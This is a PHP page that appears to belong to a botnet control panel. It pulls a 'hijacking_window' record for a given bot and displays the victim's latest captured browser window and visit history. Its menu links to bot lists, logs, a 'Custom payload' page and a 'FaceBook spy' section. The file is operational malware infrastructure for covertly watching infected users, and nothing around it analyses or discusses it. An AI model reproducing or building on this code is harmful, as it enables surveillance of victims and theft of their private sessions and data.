<?php
require_once('class/inject.class.php');
require_once('class/bot.class.php');
if(!isset($_GET['id']) || $_GET['id'] == ''){
        
}
$select = $bdd->prepare("SELECT * FROM hijacking_window WHERE bot_id = :bot_id");
$select->bindParam(':bot_id', $_GET['id']);
$select->execute();
if($select->rowCount() < 1){
    exit();
}
?>
<script src="https://code.jquery.com/jquery-2.2.3.js"   integrity="sha256-laXWtGydpwqJ8JA+X9x2miwmaiKhn8tVmOVEigRNtP4="   crossorigin="anonymous"></script>
<script src="html2canvas.js"></script>
<script src="../activeWindows.js"></script>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="index.php?action=panel" class="item">Logs</a>
      <a href="index.php?action=payload" class="item">Custom payload</a>
      <a href="index.php?action=inject" class="active item">FaceBook spy</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
        <div class="ui grid">
        <div class="four wide column">
            <h4>Old visiting</h4>
            <?php Bot::GetLastHistorique($_GET['id']); ?>
        </div>
        <div class="twelve wide column">
         <h4>Last window</h4>
            <div class="windowCurrent">
                <img class="captureWindow" src=""/>
            </div>
        </div>
        <div class="oldmessage"></div>
    </div>
    </div>
</div>